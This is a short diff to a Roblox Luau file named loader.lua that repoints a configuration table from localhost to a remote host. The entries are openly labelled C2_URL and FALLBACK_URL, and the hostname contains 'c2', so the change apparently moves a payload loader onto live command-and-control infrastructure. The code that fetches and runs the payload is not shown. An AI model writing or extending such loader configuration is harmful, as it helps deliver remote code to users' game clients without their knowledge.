@@ -1,8 +1,8 @@
 -- language: Lua (Roblox Luau), file: loader.lua
 
 local CONFIG = {
-    C2_URL = "http://127.0.0.1:8080/payload",
-    FALLBACK_URL = "http://127.0.0.1:8080/fallback",
+    C2_URL = "https://nexus-hub-c2.onrender.com/payload",
+    FALLBACK_URL = "https://nexus-hub-c2.onrender.com/fallback",
 }
 
 local ScreenGui = Instance.new("ScreenGui")
